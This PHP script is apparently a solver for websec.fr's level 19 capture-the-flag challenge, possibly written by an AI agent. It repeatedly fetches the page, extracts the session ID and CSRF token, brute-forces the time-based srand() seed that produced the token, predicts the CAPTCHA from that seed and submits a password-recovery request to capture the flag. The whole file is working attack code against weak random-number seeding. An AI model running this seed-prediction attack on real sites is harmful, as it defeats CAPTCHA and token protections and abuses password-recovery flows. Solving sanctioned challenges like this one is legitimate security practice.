<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║           INFINITE ATTACK MODE - NO STOP UNTIL FLAG       ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

$total_attempts = 0;
$round = 0;

while (true) {
    $round++;
    echo "\n[ROUND $round] Starting new attack round...\n";
    
    // Estrategia: Hacer request y probar TODOS los timestamps posibles en un rango muy amplio
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $req_time = time();
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!$response) {
        echo "  [-] Request failed, retrying...\n";
        sleep(1);
        continue;
    }
    
    // Extraer session ID
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) {
        echo "  [-] Could not extract session ID, retrying...\n";
        continue;
    }
    $session_id = $matches[1];
    
    // Extraer token
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) {
        echo "  [-] Could not extract CSRF token, retrying...\n";
        continue;
    }
    $real_token = $token_match[1];
    
    echo "  [+] Session: $session_id\n";
    echo "  [+] Token: $real_token\n";
    echo "  [+] Request time: $req_time (" . date('H:i:s', $req_time) . ")\n";
    
    // Probar con un rango MASIVO - desde hace 2 horas hasta dentro de 1 hora
    $start_seed = $req_time - 7200;
    $end_seed = $req_time + 3600;
    
    echo "  [*] Testing seeds from $start_seed to $end_seed...\n";
    
    for ($seed = $start_seed; $seed <= $end_seed; $seed++) {
        srand($seed);
        $test_token = generate_random_text(32);
        
        $total_attempts++;
        
        if ($test_token === $real_token) {
            echo "\n  [+] ✓✓✓ SEED FOUND! ✓✓✓\n";
            echo "  [+] Seed: $seed (" . date('Y-m-d H:i:s', $seed) . ")\n";
            echo "  [+] Total attempts: $total_attempts\n\n";
            
            // Generar el CAPTCHA
            srand($seed);
            generate_random_text(32); // Skip token
            $captcha = generate_random_text(25);
            
            echo "  [+] Predicted CAPTCHA: $captcha\n\n";
            echo "  [*] Submitting...\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\n╔════════════════════════════════════════════════════════════╗\n";
                echo "║                   🎉🎉🎉 SUCCESS! 🎉🎉🎉                  ║\n";
                echo "╠════════════════════════════════════════════════════════════╣\n";
                echo "║  CAPTCHA BROKEN AFTER $total_attempts ATTEMPTS!           \n";
                
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    $flag = $flag_match[0];
                    echo "║                                                            ║\n";
                    echo "║  FLAG: " . str_pad($flag, 49) . "║\n";
                    echo "║                                                            ║\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag . "\n");
                    echo "║  (Saved to FLAG.txt)                                       ║\n";
                    echo "╚════════════════════════════════════════════════════════════╝\n";
                    exit(0);
                }
            } else {
                echo "  [-] Submission failed, but seed was correct!\n";
                if (strpos($result, 'Invalid captcha') !== false) {
                    echo "  [-] Server says: Invalid captcha\n";
                }
            }
            
            break;
        }
        
        if ($total_attempts % 1000 == 0) {
            echo "  [*] Progress: $total_attempts attempts, current seed: $seed (" . date('H:i:s', $seed) . ")\n";
        }
    }
    
    echo "  [-] No match in this round after " . ($end_seed - $start_seed + 1) . " seeds tested\n";
    echo "  [*] Total attempts so far: $total_attempts\n";
}
?>